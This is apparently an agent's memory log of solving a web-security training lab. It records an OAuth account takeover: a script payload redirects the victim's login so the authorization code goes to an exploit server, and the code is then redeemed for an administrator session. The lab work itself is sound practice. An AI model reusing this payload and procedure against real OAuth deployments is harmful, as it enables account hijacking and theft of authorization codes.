---
metadata:
  node_type: memory
name: "Lab Runs - OAuth redirect_uri Account Hijack"
description: "lab-oauth-account-hijacking-via-redirect-uri/A solved: OAuth provider accepted arbitrary external redirect_uri, code leaked to exploit-server access log, redeemed at lab /oauth-callback as administrator, carlos deleted"
last_updated: 2026-10-10T13:31:49+08:00
created: 2026-10-10T13:31:49+08:00
---

### 2026-10-10 arm A - lab-oauth-account-hijacking-via-redirect-uri (canonical path, solved x1)

- launch: range_launch launch-url 直吃 canonical 路径, reused:false;实例 0ac70067034f643d804c8fbd00520001, exploit 0a0c00ce03ad64b880f18eb301390040。
- 题面/path:/login 404(本题无本地登录页),真正的入口是 /my-account --302--> /social-login。
- /social-login 回 meta refresh 到 OAuth 端 /auth?client_id=mda1vnur5xcazchs9t4jp&redirect_uri=https://LAB/oauth-callback&response_type=code&scope=openid%20profile%20email。
- 缺陷判定:把 redirect_uri 整体换成 exploit-server 域名后,OAuth 端 /auth 不报错、正常进 interaction 登录页(交互态只带 client_id)。证明校验缺失=任意外部 redirect_uri 收码。
- 自验:wiener:peter 走完 interaction(/login -> /interaction/<id>/confirm -> /auth/<id> 302),Location 直接是 https://exploit-.../?code=DlRy_...(自己的码),确认收码面成立。
- 攻击面装配(exploit server 表单三件:responseFile=/exploit + responseHead + responseBody;STORE 缺 responseFile 即 400 "Missing parameter responseFile",填 "" 又报 "File must start with /")。
- 载荷:<script>location='https://oauth-<id>.oauth-server.net/auth?client_id=...&redirect_uri=https%3A%2F%2Fexploit-<id>.exploit-server.net%2F&response_type=code&scope=openid%20profile%20email'</script>
- 投递:formAction=DELIVER_TO_VICTIM 必须重复 responseHead+responseBody 且 --follow 才真正 summon victim(第一次未跟 302 时 victim 不出现在日志)。
- 证据链:GET /log 见 victim 行 `GET /exploit/ 200 (Victim)` 紧跟 `GET /?code=A1RE9qv9HGPuJrZTpKNtzCX7VvVM-_90idORsZxd8sU 200 (Victim)` = 管理员码到手。
- 兑换:GET /oauth-callback?code=<admin code> 用全新 jar(cj2)即可,336 行响应 Set-Cookie session=Ybtb...,导航出现 Admin panel + /my-account?id=administrator。
- 收尾:GET /admin 取删除入口(GET /admin/delete?username=carlos,无 csrf),--follow 后 banner 翻 is-solved + "Congratulations" + "User deleted successfully!"。
- 复用教训:换域 redirect_uri 是本题第一试;admin 侧无 consent 阻断(已授权会话直接放行)。
